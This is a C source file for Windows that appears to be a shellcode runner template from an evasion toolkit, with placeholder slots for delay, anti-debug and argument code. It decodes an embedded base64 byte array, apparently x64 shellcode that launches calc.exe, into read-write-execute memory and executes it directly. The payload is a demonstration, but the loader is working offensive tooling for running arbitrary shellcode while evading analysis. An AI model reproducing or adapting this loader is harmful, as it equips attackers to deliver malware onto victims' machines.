#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <wincrypt.h>

//####DEFINE####

int base64_decode_f328998ea23d451c8275c4ed3a69ba2e(unsigned char* data, int data_len)
 {
    DWORD base64_len = 0;
    BOOL result;

    // Step 1: Convert hex representation to Base64 encoded string

    // Get the required size for the base64 encoded string
    printf("\n");
    printf("DEBUG:Before B64:");
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64_len)) {
        fprintf(stderr, "Error getting required size for base64 encoding. Error code: %lu\n", GetLastError());
        return -1;
    }

    // Allocate memory for the base64 encoded string
    unsigned char* base64_encoded = (unsigned char*)malloc(base64_len);
    if (base64_encoded == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return -1;
    }

    // Perform the conversion to base64
    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (LPSTR)base64_encoded, &base64_len)) {
        fprintf(stderr, "Error converting hex to base64. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        return -1;
    }

    // Print the Base64 string
    printf("Base64 encoded data: %.*s\n", base64_len, base64_encoded);

    // Step 2: Decode the Base64 string
    DWORD decoded_len = 0;

    // First, call CryptStringToBinaryA to get the required size for the decoded data
    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL);
    if (!result) {
        fprintf(stderr, "Error getting decoded length. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        return -1;
    }

    unsigned char* decoded_data = (unsigned char*)malloc(decoded_len);
    if (decoded_data == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        free(base64_encoded);
        return -1;
    }

    // Now, decode the base64 data
    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, decoded_data, &decoded_len, NULL, NULL);
    if (!result) {
        fprintf(stderr, "Error decoding base64 data. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        free(decoded_data);
        return -1;
    }

    // Copy the decoded data back to the original data buffer
    memcpy(data, decoded_data, decoded_len);

    printf("\n");
    printf("DEBUG:After B64:");
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    free(base64_encoded);
    free(decoded_data);

    return decoded_len;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x2f,0x45,0x69,0x44,0x35,0x50,0x44,0x6f,0x77,0x41,0x41,0x41,0x41,0x45,0x46,0x52,0x51,0x56,0x42,0x53,0x55,0x56,0x5a,0x49,0x4d,0x64,0x4a,0x6c,0x53,0x49,0x74,0x53,0x59,0x45,0x69,0x4c,0x55,0x68,0x68,0x49,0x69,0x31,0x49,0x67,0x53,0x49,0x74,0x79,0x55,0x45,0x67,0x50,0x74,0x30,0x70,0x4b,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x44,0x78,0x68,0x66,0x41,0x49,0x73,0x49,0x45,0x48,0x42,0x79,0x51,0x31,0x42,0x41,0x63,0x48,0x69,0x37,0x56,0x4a,0x42,0x55,0x55,0x69,0x4c,0x55,0x69,0x43,0x4c,0x51,0x6a,0x78,0x49,0x41,0x64,0x43,0x4c,0x67,0x49,0x67,0x41,0x41,0x41,0x42,0x49,0x68,0x63,0x42,0x30,0x5a,0x30,0x67,0x42,0x30,0x46,0x43,0x4c,0x53,0x42,0x68,0x45,0x69,0x30,0x41,0x67,0x53,0x51,0x48,0x51,0x34,0x31,0x5a,0x49,0x2f,0x38,0x6c,0x42,0x69,0x7a,0x53,0x49,0x53,0x41,0x48,0x57,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x45,0x48,0x42,0x79,0x51,0x31,0x42,0x41,0x63,0x45,0x34,0x34,0x48,0x58,0x78,0x54,0x41,0x4e,0x4d,0x4a,0x41,0x68,0x46,0x4f,0x64,0x46,0x31,0x32,0x46,0x68,0x45,0x69,0x30,0x41,0x6b,0x53,0x51,0x48,0x51,0x5a,0x6b,0x47,0x4c,0x44,0x45,0x68,0x45,0x69,0x30,0x41,0x63,0x53,0x51,0x48,0x51,0x51,0x59,0x73,0x45,0x69,0x45,0x67,0x42,0x30,0x45,0x46,0x59,0x51,0x56,0x68,0x65,0x57,0x56,0x70,0x42,0x57,0x45,0x46,0x5a,0x51,0x56,0x70,0x49,0x67,0x2b,0x77,0x67,0x51,0x56,0x4c,0x2f,0x34,0x46,0x68,0x42,0x57,0x56,0x70,0x49,0x69,0x78,0x4c,0x70,0x56,0x2f,0x2f,0x2f,0x2f,0x31,0x31,0x49,0x75,0x67,0x45,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x53,0x49,0x32,0x4e,0x41,0x51,0x45,0x41,0x41,0x45,0x47,0x36,0x4d,0x59,0x74,0x76,0x68,0x2f,0x2f,0x56,0x75,0x2f,0x43,0x31,0x6f,0x6c,0x5a,0x42,0x75,0x71,0x61,0x56,0x76,0x5a,0x33,0x2f,0x31,0x55,0x69,0x44,0x78,0x43,0x67,0x38,0x42,0x6e,0x77,0x4b,0x67,0x50,0x76,0x67,0x64,0x51,0x57,0x37,0x52,0x78,0x4e,0x79,0x62,0x32,0x6f,0x41,0x57,0x55,0x47,0x4a,0x32,0x76,0x2f,0x56,0x59,0x32,0x46,0x73,0x59,0x79,0x35,0x6c,0x65,0x47,0x55,0x41};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = base64_decode_f328998ea23d451c8275c4ed3a69ba2e(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
